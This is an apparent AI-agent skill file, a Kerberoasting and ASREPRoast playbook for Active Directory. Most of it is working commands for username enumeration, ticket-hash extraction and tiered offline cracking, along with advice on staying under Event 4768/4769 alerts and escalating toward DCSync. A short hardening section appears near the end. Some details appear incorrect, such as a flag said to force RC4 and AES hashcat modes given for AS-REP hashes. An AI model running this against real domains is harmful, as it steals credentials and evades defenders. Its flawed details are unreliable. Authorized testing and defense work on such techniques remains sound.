---
name: Kerberoasting + ASREPRoast
description: Reference for Kerberoasting and ASREPRoast covering SPN enumeration, TGS extraction, ASREP request without preauth, hashcat / john modes, RC4 vs AES service-ticket selection, and OPSEC controls.
---

# Kerberoasting + ASREPRoast

Reference for the two canonical Kerberos credential-extraction primitives: ASREPRoast (no credentials required) and Kerberoasting (any valid domain credential required). Pull this in mid-engagement when you need a focused playbook separate from the broader `/skill ad_kill_chain`.

> Black-box scope: probes drive Kerberos against a domain controller via impacket. The agent has every required tool baked in (`impacket-GetUserSPNs`, `impacket-GetNPUsers`, `kerbrute`, `hashcat`, `john`, `cewl`).

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Username enumeration (no creds) | `kali_shell kerbrute userenum` | Requires DC IP + domain + wordlist. |
| ASREPRoast hash extraction | `kali_shell impacket-GetNPUsers` | No-preauth users only. |
| Kerberoast hash extraction | `kali_shell impacket-GetUserSPNs -request` | Requires any valid domain cred. |
| Offline cracking | `kali_shell hashcat` | Modes: 18200 (AS-REP), 13100 (TGS-REP). |
| Wordlist generation | `kali_shell cewl` | Build target-specific wordlists from public sites. |

## Working directory

```bash
mkdir -p /tmp/kroast && cd /tmp/kroast
```

Reuse this for the entire skill. Final outputs land here. Compatible with `/skill ad_kill_chain`'s `/tmp/adkc/` if both skills run in the same session.

## Phase 1: ASREPRoast (no credentials)

ASREPRoast targets users with `DONT_REQUIRE_PREAUTH` (`UF_DONT_REQUIRE_PREAUTH`, 0x0040000) set. Without preauth, the KDC returns an AS-REP encrypted with the user's password-derived key. Offline-crackable.

### Without a userlist

```bash
# Step 1: Enumerate usernames via Kerberos pre-auth timing
kerbrute userenum --dc $DC_IP -d $DOMAIN \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o /tmp/kroast/users.txt

# Step 2: Strip lines that aren't usernames
sed -i -nE 's/.*VALID USERNAME:\s+(\S+)@.*/\1/p' /tmp/kroast/users.txt
# OR if you used --output-format=json, jq -r '.username' instead

# Step 3: Remove krbtgt and Administrator (never spray / never roast these)
sed -i -E '/^(krbtgt|administrator)$/Id' /tmp/kroast/users.txt
```

### With a userlist

If anonymous SMB / LDAP enumeration succeeded earlier, save users to `/tmp/kroast/users.txt` directly.

### Request AS-REPs

```bash
impacket-GetNPUsers -dc-ip $DC_IP \
  -usersfile /tmp/kroast/users.txt \
  -no-pass -format hashcat \
  -outputfile /tmp/kroast/asrep.hash \
  "$DOMAIN/"
```

Output (one hash per no-preauth user):

```
$krb5asrep$23$alice@CORP.LOCAL:abc123...
```

Empty file = no users have `DONT_REQUIRE_PREAUTH` set; ASREPRoast not viable.

### When you have a single name and want to verify

```bash
impacket-GetNPUsers -dc-ip $DC_IP -no-pass -format hashcat \
  "$DOMAIN/alice"
```

Returns a hash on success or `KDC_ERR_C_PRINCIPAL_UNKNOWN` / `KDC_ERR_PREAUTH_REQUIRED` otherwise. The `PREAUTH_REQUIRED` error confirms the user exists but is not roastable.

### Cracking AS-REP hashes (mode 18200)

```bash
# Build a target-specific wordlist
cewl -d 2 -w /tmp/kroast/company.txt https://$PUBLIC_SITE 2>/dev/null || true

# Hashcat with rules
hashcat -m 18200 /tmp/kroast/asrep.hash \
  /tmp/kroast/company.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force --potfile-path /tmp/kroast/hc.pot

# Show what cracked
hashcat -m 18200 /tmp/kroast/asrep.hash --show \
  --potfile-path /tmp/kroast/hc.pot
```

Difficulty notes:

| Encryption type | Hashcat mode | Speed (modern GPU) |
|---|---|---|
| `etype 23` (RC4-HMAC) | 18200 | Hundreds of millions h/s |
| `etype 17/18` (AES128/256) | 19600 / 19700 | Tens of millions h/s |

Most AD environments still issue RC4-HMAC AS-REPs because legacy compatibility. If only AES is returned, the offline crack is roughly 10x slower but still feasible against weak passwords.

### john alternative

```bash
john --wordlist=/tmp/kroast/company.txt --rules=KoreLogic /tmp/kroast/asrep.hash
john --show /tmp/kroast/asrep.hash
```

## Phase 2: Kerberoasting (requires any domain cred)

Kerberoasting requests TGS tickets for accounts with SPNs (Service Principal Names). The KDC returns a TGS encrypted with the service account's password-derived key. Offline-crackable.

You need ONE valid domain credential; even an unprivileged user works. Source it via:

- ASREPRoast (Phase 1) cracked password.
- Password spray (`/skill ad_kill_chain` Phase 5).
- GPP cpassword (SYSVOL).
- Phished / leaked credential.

### Request all TGS tickets

```bash
impacket-GetUserSPNs -dc-ip $DC_IP -request \
  -outputfile /tmp/kroast/kerberoast.hash \
  "$DOMAIN/$USER:$PASS"
```

Output (one hash per SPN-bearing account):

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$abc...
```

### Filter to specific SPNs (less noisy)

```bash
# List SPNs without requesting tickets
impacket-GetUserSPNs -dc-ip $DC_IP "$DOMAIN/$USER:$PASS"

# Then request tickets for chosen target accounts
impacket-GetUserSPNs -dc-ip $DC_IP -request-user svc_sql \
  -outputfile /tmp/kroast/svc_sql.hash \
  "$DOMAIN/$USER:$PASS"
```

### Force RC4 encryption (when AES is default)

Some modern DCs default to AES for service tickets; RC4 cracks faster. Force RC4:

```bash
impacket-GetUserSPNs -dc-ip $DC_IP -request \
  -outputfile /tmp/kroast/kerberoast_rc4.hash \
  -no-preauth-key \
  "$DOMAIN/$USER:$PASS"
```

Note: this works only when the target account allows RC4 (`msDS-SupportedEncryptionTypes` includes 0x4). Modern AD often disables RC4 entirely.

### Cracking TGS hashes (mode 13100)

```bash
hashcat -m 13100 /tmp/kroast/kerberoast.hash \
  /tmp/kroast/company.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force --potfile-path /tmp/kroast/hc.pot

hashcat -m 13100 /tmp/kroast/kerberoast.hash --show \
  --potfile-path /tmp/kroast/hc.pot
```

| Encryption type | Hashcat mode |
|---|---|
| RC4-HMAC | 13100 |
| AES128 | 19600 |
| AES256 | 19700 |

Service accounts often have long-lived passwords (set once, never rotated) and generally weak entropy compared to user accounts -- they are higher-yield targets than user-bound ASREP hashes.

### john alternative

```bash
john --wordlist=/tmp/kroast/company.txt --rules /tmp/kroast/kerberoast.hash
john --show /tmp/kroast/kerberoast.hash
```

## Targeted Kerberoasting (no full enumeration needed)

When you have a specific service account name and want only its TGS:

```bash
impacket-GetUserSPNs -dc-ip $DC_IP -request-user svc_backup \
  -outputfile /tmp/kroast/svc_backup.hash \
  "$DOMAIN/$USER:$PASS"
```

Useful when:

- You want minimal Kerberos traffic to avoid Event 4769 spam.
- BloodHound flagged a single high-value SPN target.

## Roastable-account discovery

```bash
# All accounts with SPNs (will be requested with -request)
impacket-GetUserSPNs -dc-ip $DC_IP "$DOMAIN/$USER:$PASS"

# Only DA / privileged-group SPNs
nxc ldap $DC_IP -u $USER -p $PASS \
  --kerberoasting /tmp/kroast/kerberoasting.txt
# nxc filters via LDAP query for users with SPNs in privileged groups
```

Or via `bhgraph` (when `/skill ad_kill_chain` has populated state):

```bash
bhgraph kerberoastable
```

For ASREPRoast targets:

```bash
bhgraph asreproastable
```

## Cracking strategy

A tiered approach yields the fastest wins:

```bash
# Tier 1: target-specific wordlist (cewl) + best64 rules
hashcat -m 13100 /tmp/kroast/kerberoast.hash \
  /tmp/kroast/company.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --potfile-path /tmp/kroast/hc.pot

# Tier 2: rockyou + best64
hashcat -m 13100 /tmp/kroast/kerberoast.hash \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --potfile-path /tmp/kroast/hc.pot

# Tier 3: rockyou + dive (most aggressive default rule)
hashcat -m 13100 /tmp/kroast/kerberoast.hash \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/dive.rule \
  --potfile-path /tmp/kroast/hc.pot

# Tier 4: mask attack on common password shapes (e.g. CompanyName2024!)
hashcat -m 13100 /tmp/kroast/kerberoast.hash \
  -a 3 '?u?l?l?l?l?l?l?l2024?s' \
  --potfile-path /tmp/kroast/hc.pot

# Show all cracked
hashcat -m 13100 /tmp/kroast/kerberoast.hash --show --potfile-path /tmp/kroast/hc.pot
```

Apply same tiers to `-m 18200` (AS-REP) and `-m 19600/19700` (AES variants).

## OPSEC

| Event | Why |
|---|---|
| Windows Event 4768 (Kerberos AS-REQ) | ASREPRoast generates 4768 with `Pre-Authentication Type: 0` (none); searchable signature |
| Windows Event 4769 (Kerberos TGS-REQ) | Kerberoast generates 4769 for each requested SPN; many enterprises alert on bulk 4769 |
| Honeypot accounts | Some defenders plant accounts named like high-value SPNs; querying them triggers alerts |

Mitigations:

- Request TGS for ONE target at a time when possible (`-request-user`), not all SPNs at once.
- Spread requests over time (`sleep 60` between targeted requests).
- Notify the operator before bulk Kerberoasting; many SOCs alert on `Event 4769 spike`.
- For ASREPRoast: it cannot be mitigated by spread because the `-usersfile` request is intrinsically bulk. Operator approval first.

Per `/skill ad_kill_chain`, emit an operator-visible message before bulk Kerberos operations:

```
"About to run Kerberoast against $DC_IP - this generates Event 4769 and may trip EDR. Proceeding unless you say stop."
```

## Validation shape

A clean Kerberoasting / ASREPRoast finding includes:

1. The target DC IP + domain.
2. The credential used (for Kerberoast) or "no creds" (for ASREPRoast).
3. The hash file (`/tmp/kroast/asrep.hash` or `/tmp/kroast/kerberoast.hash`) with the captured hashes.
4. Cracked credentials (`USERNAME:PASSWORD`) -- redacted in reports.
5. Cracking time + ruleset that landed it.
6. Pivot path: which account, which group, what privilege.

## False positives

- ASREPRoast returns no hashes -> no users have `DONT_REQUIRE_PREAUTH`. Not a finding.
- Kerberoast returns hashes but every password is strong (>20 chars random, gMSA-managed). Cracking infeasible; document the attempt and move on.
- AES-only environment + strong passwords; RC4-friendly attack path closed.
- DC has Kerberos canonicalization disabled; some impacket variants fail.

## Hardening summary

- Set strong, randomly-generated passwords on every service account (>= 25 characters).
- Use Group Managed Service Accounts (gMSA) where possible: 240-byte random passwords, auto-rotated, not Kerberoastable in the same way (still extractable via `gMSADumper.py` if `ReadGMSAPassword` edge exists; see `/skill ad_kill_chain`).
- Disable RC4 entirely (`msDS-SupportedEncryptionTypes = 0x18` for AES128+AES256-only). Forces TGSes to AES, which is harder to crack.
- Remove `DONT_REQUIRE_PREAUTH` from accounts that don't need it.
- Audit Event 4768 / 4769 patterns; alert on bulk requests.
- Honeypot SPN accounts named to be attractive (`svc_backup_admin`, `svc_db_root`); alert on queries.

## Hand-off

```
Cracked service-account password   -> /skill ad_kill_chain (Phase 5/6 with the new credential)
Cracked user password              -> /skill ad_kill_chain Phase 5 spray + BloodHound own
DA / Domain Admin cracked          -> proceed directly to DCSync (/skill ad_kill_chain Phase 9)
gMSA + ReadGMSAPassword edge       -> /skill ad_kill_chain (Phase 6 BloodHound walk)
AD-CS template abuse               -> /skill ad_cs_esc
Path-to-DA discovery                -> /skill bloodhound_path_to_da
```

## Pro tips

- Always run ASREPRoast first when you have ZERO credentials. It is the cheapest credential-extraction primitive: no auth, no spray-lockout risk, just KDC queries.
- Service accounts (`svc_*`, `sql_*`, `iis_*`) tend to have weaker passwords than user accounts because admins write them down or reuse old conventions. They are the highest-yield Kerberoast targets.
- The cewl-derived `/tmp/kroast/company.txt` wordlist often outperforms rockyou on internal targets because admins reuse company-themed passwords.
- `kerbrute userenum` is much quieter than LDAP enumeration on most DCs because Kerberos pre-auth queries are not typically alerted on (compared to bulk LDAP queries).
- Hashcat mode 19600 / 19700 (AES variants) cracks ~10x slower than 13100 (RC4) on the same hardware. Plan accordingly.
- The `Pre-Authentication Type: 0` field on Event 4768 is the canonical defender signature for ASREPRoast. Mature SOCs alert on it instantly.
- For targeted Kerberoasting against a known high-value SPN (BloodHound `kerberoastable` query), a single TGS request and offline crack is cleaner and quieter than a bulk dump.
